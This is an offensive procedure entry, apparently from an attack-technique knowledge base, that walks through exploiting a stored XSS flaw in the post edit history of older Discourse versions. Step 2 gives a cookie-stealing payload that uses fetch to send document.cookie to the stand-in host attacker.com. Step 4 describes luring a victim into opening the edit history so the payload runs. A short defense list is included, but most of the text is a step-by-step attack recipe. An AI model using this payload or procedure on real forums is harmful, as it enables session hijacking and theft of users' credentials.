---
tags:
  - xss
  - stored-xss
  - discourse
  - edit-history
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T00:11:09.443Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: b0d1afbc-64f4-4954-acfd-0a32578cd79d
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Exploit Public-Facing Application]]'
---
# Inject-and-Trigger-Stored-XSS-in-Discourse-Edit-History

## Summary

This procedure exploits a stored cross-site scripting (XSS) vulnerability in Discourse's post edit history feature, where injected JavaScript payloads in post titles or content are not sanitized and execute when users view the history via the edit icon. It enables attackers to steal session cookies, passwords, or execute arbitrary code in victims' browsers, with potential for widespread impact in public topics.

## Description

The vulnerability affects Discourse versions up to 1.9 and below 2.0.0 beta6, stemming from insufficient sanitization of historical post revisions. Attackers can inject payloads during post creation or editing, which persist in the backend database. When a victim clicks the yellow pencil icon to view edit history (e.g., in private messages or topics like https://try.discourse.org/t/the-room-appreciation-topic/289/6), the raw payload renders and executes in their browser context. This was confirmed via PoC on try.discourse.org, including image uploads with embedded scripts. Prerequisites include an attacker account with post privileges; no special tools are needed beyond a web browser.

## Requirements

1. Valid attacker account on a vulnerable Discourse instance (e.g., try.discourse.org)
2. Ability to send private messages or post in topics
3. Victim access to the forum and willingness to view post edits
4. Web browser for manual injection and verification

## Defense

Defensive measures and detection strategies:

- Upgrade Discourse to version 2.0.0 beta6 or later, which includes proper sanitization of edit history
- Enable Content Security Policy (CSP) to restrict script execution
- Monitor for anomalous JavaScript alerts or outbound requests from forum pages
- Implement input validation and output encoding for all user-generated content, including historical revisions

## Objectives

1. Inject and store malicious JavaScript payload in post edit history
2. Trigger payload execution in the victim's browser upon viewing edits
3. Exfiltrate sensitive data like cookies or session tokens to attacker-controlled server

## Instructions

### Step 1: Initiate Interaction and Compose Post

**Context**: Start a private message or topic reply to target the victim and prepare for payload injection.

Navigate to the Discourse instance, log in, and either start a new private message or reply to a topic (e.g., https://try.discourse.org/t/recommended-reading-for-community-and-foss-enthusiasts/278). In the compose window, prepare to add content.

### Step 2: Inject XSS Payload

**Context**: Embed the JavaScript payload in the post title, body, or via uploaded image to ensure it stores unsanitized.

In the post composer, upload an optional image (e.g., a benign Simpson image) and directly insert the payload in the title or body field. Example payload for testing: `<script>alert('XSS')</script>`. For exploitation: `<script>fetch('http://attacker.com/steal?data='+btoa(document.cookie))</script>`. Publish the post.

> The payload will not execute immediately in the main post view due to front-end sanitization but persists in the backend.

### Step 3: Generate Edit History

**Context**: Perform actions to create historical revisions containing the payload.

After publishing, edit the post (e.g., change a word), save, then optionally delete and restore it. This populates the edit history accessible via the yellow pencil icon.

> Verify by hovering over the pencil icon; it should indicate revisions available.

### Step 4: Trigger Execution

**Context**: Induce the victim to view the edit history, executing the payload.

Share the post link with the victim or rely on forum notifications. When they click the yellow pencil icon next to the post, the history loads, rendering the unsanitized payload and executing the script in their browser.

> Observe execution via alert popup or network logs showing exfiltration to your server.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]
- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- xss
- stored-xss
- discourse
- web-exploitation
